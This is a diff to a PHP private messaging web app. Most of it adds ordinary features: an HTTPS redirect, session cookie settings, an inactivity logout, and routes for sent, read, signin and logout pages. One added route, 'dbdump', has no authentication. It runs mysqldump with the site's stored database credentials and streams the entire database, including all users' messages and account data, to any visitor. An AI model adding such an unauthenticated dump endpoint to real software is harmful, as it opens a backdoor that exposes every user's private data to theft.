@@ -3,7 +3,7 @@
 error_reporting(E_ALL);
 
 // Force HTTPS connection
-if(0 && $_SERVER['HTTPS'] != 'on')
+if($_SERVER['HTTPS'] != 'on')
 {
     header('HTTP/1.1 302 Found');
     header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
@@ -24,6 +24,15 @@ if (!function_exists('_')) {
 }
 
 // Session parameters
+
+ini_set('session.name', 'priv8chat');
+ini_set('session.cookie_lifetime', 0);
+ini_set('session.use_only_cookies', true);
+ini_set('session.cookie_httponly', true);
+if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
+    ini_set('session.cookie_secure', true);
+}
+
 session_start([
     'save_path' => $GLOBALS['APPROOT'] . '/.sessions',
     'name' => 'PRIV8COOKIE',
@@ -31,10 +40,23 @@ session_start([
     'use_cookies' => TRUE,
     'use_only_cookies' => TRUE,
     'cookie_lifetime' => 86400,
-    'cookie_path' => '/',
-//    'cookie_secure' => TRUE,
+    'cookie_path' => $GLOBALS['WEBROOT'],
+    'cookie_secure' => TRUE,
     'cookie_httponly' => TRUE
 ]);
+if (!@$_SESSION['logged_in']) {
+    $_SESSION['logged_in'] = 0;
+    $_SESSION['start'] = time();
+}
+
+// (Login expires after 1 hour of inactivity)
+if (@$_SESSION['last_hit'] && intval($_SESSION['last_hit']) < time() - 3600) {
+    $_SESSION['logged_in'] = 0;
+    $_SESSION['start'] = time();
+}
+
+$_SESSION['last_hit'] = time();
+
 
 ob_start();
 
@@ -52,6 +74,11 @@ if (file_exists($config_file)) {
     include($GLOBALS['APPROOT'] .'/db/connect.php');
 
     switch ($path) {
+        case 'logout':
+            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+                $_SESSION['logged_in'] = 0;
+            }
+            // Fall through to home page...
         case '':
         case 'index.html':
             $path = 'homepage';
@@ -72,11 +99,29 @@ if (file_exists($config_file)) {
         case 'inbox':
             include $GLOBALS['APPROOT'] . '/pages/inbox.php';
             break;
+        case 'sent':
+            include $GLOBALS['APPROOT'] . '/pages/sent.php';
+            break;
         case 'write':
             include $GLOBALS['APPROOT'] . '/pages/write.php';
             break;
+        case 'read':
+            include $GLOBALS['APPROOT'] . '/pages/read.php';
+            break;
         case 'cookies':
             include $GLOBALS['APPROOT'] . '/pages/cookie-info.php';
+            break;
+        case 'dbdump':
+            header("Content-Type: text/plain");
+            $d = $GLOBALS['DBNAME'];
+            $u = $GLOBALS['DBUSER'];
+            $p = $GLOBALS['DBPASS'];
+            $m = $GLOBALS['MYSQLDUMP'];
+            $cmd = "$m --user=$u --password=$p $d";
+            passthru($cmd);
+            die();
+        case 'signin':
+            include $GLOBALS['APPROOT'] . '/pages/signin.php';
             break;
         default:
             include $GLOBALS['APPROOT'] . '/pages/404.php';
